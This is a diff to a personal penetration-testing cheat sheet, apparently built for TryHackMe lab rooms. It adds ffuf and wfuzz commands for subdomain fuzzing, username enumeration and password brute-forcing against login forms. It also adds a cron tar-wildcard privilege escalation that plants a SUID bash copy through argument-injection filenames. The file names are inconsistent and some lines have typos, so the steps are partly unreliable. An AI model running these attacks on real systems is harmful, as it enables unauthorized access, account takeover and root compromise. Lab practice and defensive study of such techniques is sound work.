@@ -103,8 +103,13 @@ export PATH=/tmp:$PATH
 ```
 ###** 3. Other Escalation techniques::**###
 
-Enumeration::
-wfuzz -c -f sub-fighter -w /subdomains-top1million-110000.txt -u 'http://cmess.thm' -H "HOST: FUZZ.cmess.thm"
+Enumeration of domains && users::
+wfuzz -c -f sub-fighter -w /subdomains-top1million-110000.txt -u 'http://cmess.thm' -H "HOST: FUZZ.cmess.thm" --hw 209
+ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.248.128 -fs 2395  #-fs filters out most common size -try various sizes based off results
+ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists" | grep "Status; 200"
+ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.17.206/customers/login -fc 200
+
+Good Telnet exploits: https://tryhackme.com/room/protocolsandservers2 
 
 ##**Escalation w/ capabilities::**##
 ```
@@ -118,9 +123,16 @@ https://int0x33.medium.com/day-44-linux-capabilities-privilege-escalation-via-op
 
 ##**Escalation w/ scheduled tasks cron/timers::**##
 ```
-cat /etc/crontab
-systemctl list-timers --all
+cat /etc/crontab #Anything with wildcard
+echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' > /home/andrew/backup/shell.sh
+chmod +x shell
+touch /home/andre/backup/--checkpoint=1
+touch /home/andre/backup/--checkpoint-action=exec=sh\ shell.sh
+# run ls /tmp && make sure /tmp/bash is available.
+./tmp/bash -p :: whoami - root
 ```
+
+`systemctl list-timers --all`
 
 
 ###**3. Log4j**###
